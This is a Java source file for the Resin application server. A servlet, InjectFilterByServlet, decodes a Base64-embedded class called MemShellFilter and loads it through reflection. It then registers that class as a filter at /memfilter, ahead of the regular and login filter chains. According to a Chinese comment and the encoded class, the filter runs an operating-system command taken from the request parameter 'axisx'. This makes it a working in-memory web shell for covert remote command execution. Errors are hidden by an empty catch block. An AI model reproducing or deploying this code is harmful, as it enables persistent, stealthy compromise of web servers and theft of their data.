package com.axisx;

import com.caucho.server.dispatch.FilterConfigImpl;
import sun.misc.BASE64Decoder;

import javax.servlet.Filter;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;


public class InjectFilterByServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try{
            String filterName="MemShellFilter";
            String urlPattern="/memfilter";

            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
            Class servletInvocation=classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");

            Object contextRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
            Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);

            //此filter传入参数为axisx=ls
            String FilterBase64="yv66vgAAADQA1QoALAB4CQB5AHoIAHsKAHwAfQcAfgoAKwB/CACACwAFAIEKACsAggsAKgCDCgCEAH0HAIUKAAwAhgcAhwoADgCGCgCIAIkKAIgAigoAiwCMBwCNCgATAI4HAI8KABUAkAcAkQoAFwB4CgAVAJIHAJMKABoAeAoAGgCUCACVCgAaAJYKABcAlwoAFwCWCgAsAJgIAJkKAJoAmwgAnAoAGgCdCgCaAJ4IAJ8KAKAAoQoAoACiBwCjBwCkBwClBwCmAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABBMTWVtU2hlbGxGaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcApwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAAWUBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAARyZXNwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHAKQHAKgHAKkHAKoHAH4HAKMHAIUHAIcHAKsBAAdkZXN0cm95AQALQ29tbWFuZEV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAnJ0AQATTGphdmEvbGFuZy9SdW50aW1lOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3RkZXJyAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADaXNyAQAbTGphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXI7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsHAKwHAK0HAK4HAK8HAI0HAI8HAJEBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdmFyOAEABHZhcjEBAAR2YXIyAQAEdmFyMwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsHALABAApTb3VyY2VGaWxlAQATTWVtU2hlbGxGaWx0ZXIuamF2YQwALgAvBwCxDACyALMBAAlmaWx0ZXIhISEHALQMALUAtgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAG4AbwEABWF4aXN4DAC3AFkMAFgAWQwAuAC5BwC6AQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24MALsALwEAE2phdmEvbGFuZy9FeGNlcHRpb24HAK0MALwAvQwAvgC/BwCuDADAAMEBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAuAMIBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAuAMMBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyDADEAMUBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAxgDHAQABCgwAyADFDADGAMkMAMoAywEACV9yZXNwb25zZQcAzAwAzQDOAQACYWEMAMYAzwwA0ADLAQACYmIHALAMANEA0gwA0wDUAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAA5NZW1TaGVsbEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAA9wcmludFN0YWNrVHJhY2UBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA9qYXZhL2xhbmcvQ2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQANZ2V0U3VwZXJjbGFzcwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsAIQArACwAAQAtAAAABgABAC4ALwABADAAAAAvAAEAAQAAAAUqtwABsQAAAAIAMQAAAAYAAQAAABAAMgAAAAwAAQAAAAUAMwA0AAAAAQA1ADYAAgAwAAAANQAAAAIAAAABsQAAAAIAMQAAAAYAAQAAABQAMgAAABYAAgAAAAEAMwA0AAAAAAABADcAOAABADkAAAAEAAEAOgABADsAPAACADAAAAE+AAIACAAAAE2yAAISA7YABCvAAAU6BAE6BSoZBLYABjoFGQQSB7kACAIAOgYqGQa2AAk6BxkFuQAKAQAZB7YAC6cAFDoGGQa2AA2nAAo6BhkGtgAPsQACABEAOAA7AAwAEQA4AEUADgADADEAAAA6AA4AAAAYAAgAGQAOABoAEQAcABkAHQAkAB4ALAAfADgAJAA7ACAAPQAhAEIAJABFACIARwAjAEwAJQAyAAAAZgAKACQAFAA9AD4ABgAsAAwAPwA+AAcAPQAFAEAAQQAGAEcABQBAAEIABgAAAE0AMwA0AAAAAABNAEMARAABAAAATQBFAEYAAgAAAE0ARwBIAAMADgA/AEkASgAEABEAPABLAEwABQBNAAAAIwAD/wA7AAYHAE4HAE8HAFAHAFEHAFIHAFMAAQcAVEkHAFUGADkAAAAGAAIAVgA6AAEAVwAvAAEAMAAAACsAAAABAAAAAbEAAAACADEAAAAGAAEAAAAqADIAAAAMAAEAAAABADMANAAAAAEAWABZAAIAMAAAASkAAwAJAAAAYLgAEE0sK7YAEU4ttgASOgS7ABNZGQS3ABQ6BbsAFVkZBbcAFjoGAToHuwAXWbcAGDoIGQa2ABlZOgfGACAZCLsAGlm3ABsZB7YAHBIdtgActgAetgAfV6f/2xkItgAgsAAAAAMAMQAAACoACgAAAC0ABAAuAAoALwAQADAAGwAxACYAMgApADMAMgA0AD0ANQBaADcAMgAAAFwACQAAAGAAMwA0AAAAAABgAD0APgABAAQAXABaAFsAAgAKAFYAXABdAAMAEABQAF4AXwAEABsARQBgAGEABQAmADoAYgBjAAYAKQA3AGQAPgAHADIALgBlAGYACABNAAAAJQAC/wAyAAkHAE4HAGcHAGgHAGkHAGoHAGsHAGwHAGcHAG0AACcAOQAAAAQAAQAOACEAbgBvAAIAMAAAATMAAwAGAAAAZwFNAU4rtgAhEiK2ACNOsgACuwAaWbcAGxIktgAcLbYAJbYAHrYABKcAMDoEK7YAIbYAJhIitgAjTrIAArsAGlm3ABsSJ7YAHCy2ACW2AB62AASnAAU6BS0EtgAoLSu2ACnAACpNLLAAAgAEACcAKgAOACwAUgBVAA4AAwAxAAAANgANAAAAOwACADwABAA+AA4APwAnAEYAKgBAACwAQgA5AEMAUgBFAFUARABXAEcAXABIAGUASgAyAAAANAAFACwAKwBwAEIABAAAAGcAMwA0AAAAAABnAHEASgABAAIAZQByAEwAAgAEAGMAcwB0AAMATQAAADQAA/8AKgAEBwBOBwBSBwBTBwB1AAEHAFX/ACoABQcATgcAUgcAUwcAdQcAVQABBwBV+gABADkAAAAEAAEADAABAHYAAAACAHc=";
            byte[] FilterClass = new BASE64Decoder().decodeBuffer(FilterBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class filterClass = (Class) defineClass1.invoke(classLoader, FilterClass, 0, FilterClass.length);
            Filter filter_class=(Filter)filterClass.newInstance();

            Class filterConfigImplCls = classLoader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
            Object filterConfigImpl=filterConfigImplCls.newInstance();

            Method m1=filterConfigImpl.getClass().getDeclaredMethod("setFilterName",String.class);
            m1.setAccessible(true);
            m1.invoke(filterConfigImpl,filterName);

            Method m2=filterConfigImpl.getClass().getDeclaredMethod("setFilterClass",String.class);
            m2.setAccessible(true);
            m2.invoke(filterConfigImpl,filterName);

            // 4.X getClass | 3.X getClass().getSuperClass
            Method m4=null;
            try{
                m4=webapp.getClass().getDeclaredMethod("addFilter", FilterConfigImpl.class);
            }catch (Exception e){
                m4=webapp.getClass().getSuperclass().getDeclaredMethod("addFilter", FilterConfigImpl.class);
            }
            m4.invoke(webapp,filterConfigImpl);

            Class filterMappingCls = classLoader.loadClass("com.caucho.server.dispatch.FilterMapping");
            Object filterMapping=filterMappingCls.newInstance();

            Method m5=filterMapping.getClass().getDeclaredMethod("createUrlPattern");
            m5.setAccessible(true);
            Object o5=m5.invoke(filterMapping);

            Method m6=o5.getClass().getDeclaredMethod("addText",String.class);
            m6.setAccessible(true);
            m6.invoke(o5,urlPattern);

            Method m7=filterMapping.getClass().getSuperclass().getDeclaredMethod("setFilterName",String.class);
            m7.setAccessible(true);
            m7.invoke(filterMapping,filterName);

            Method m8=filterMapping.getClass().getSuperclass().getDeclaredMethod("setServletContext", ServletContext.class);
            m8.setAccessible(true);
            m8.invoke(filterMapping,webapp);

            // 4.X getClass | 3.X getClass().getSuperClass
            Field f1=null;
            try{
                f1=webapp.getClass().getDeclaredField("_filterMapper");
            }catch (Exception e){
                f1=webapp.getClass().getSuperclass().getDeclaredField("_filterMapper");
            }
            f1.setAccessible(true);
            Object filterMapper=f1.get(webapp);

            Field f2=filterMapper.getClass().getDeclaredField("_filterMap");
            f2.setAccessible(true);
            ArrayList filterMap=(ArrayList)f2.get(filterMapper);

            filterMap.add(0,filterMapping);

            f1.set(webapp, filterMapper);

            // 4.X getClass | 3.X getClass().getSuperClass
            Field f3=null;
            try{
                f3=webapp.getClass().getDeclaredField("_loginFilterMapper");
            }catch (Exception e){
                f3=webapp.getClass().getSuperclass().getDeclaredField("_loginFilterMapper");
            }
            f3.setAccessible(true);
            Object loginFilterMapper=f3.get(webapp);

            Field f4=loginFilterMapper.getClass().getDeclaredField("_filterMap");
            f4.setAccessible(true);
            ArrayList filterMap2=(ArrayList)f4.get(loginFilterMapper);

            filterMap2.add(0,filterMapping);
            f3.set(webapp, loginFilterMapper);

        }catch (Exception e){}
    }
}
